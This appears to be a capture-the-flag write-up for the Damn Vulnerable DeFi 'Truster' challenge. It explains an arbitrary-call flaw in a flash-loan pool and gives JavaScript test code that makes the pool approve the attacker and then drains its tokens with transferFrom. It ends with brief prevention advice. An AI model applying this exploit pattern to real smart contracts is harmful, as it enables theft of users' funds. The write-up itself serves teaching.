## Problems

This ```TrusterLenderPool``` contain a function that capable to call other smart contract function:
```js
    target.functionCall(data);
```
what's wrong with that? let's check the parameters of that function. 
```js
    function flashLoan(
        uint256 borrowAmount,
        address borrower,
        address target,
        bytes calldata data
    )
```
from that we can see that the function above can make a ```functionCall()``` to any contract (```target```) with any function (```data```). it can be okay if this contract use ```delegateCall``` (sometimes will be bad too) instead of ```call``` because with ```call```  make this contract a signer (```msg.sender```) for that transaction. So what if we call function that will allow us to transfer ERC20 from this contract to other? the function is ```approve``` from ERC20 standart.

## How to Attack 
simply make the ```TrusterLenderPool``` to interact with ```DamnVulnerableToken``` contract to approve ```attacker``` for using its token. We can do it with this following code:
```js
///truster.challenge.js
...

const data =
    (await this.token.populateTransaction
        .approve(attacker.address,TOKENS_IN_POOL))
        .data;
await this.pool
    .connect(attacker)
    .flashLoan(0,attacker.address,this.token.address,data);

...
```

After that we can simply call ```transferFrom``` function from token contract:
```js
await this.token
    .connect(attacker)
    .transferFrom(this.pool.address,attacker.address,TOKENS_IN_POOL);
```
and congrats we finally drain up the pool!

## Lesson and How to Prevent 
1. Don't trust anybody to choose what function we sould call in what contract. 
2. More carefull when handle a cross contract transaction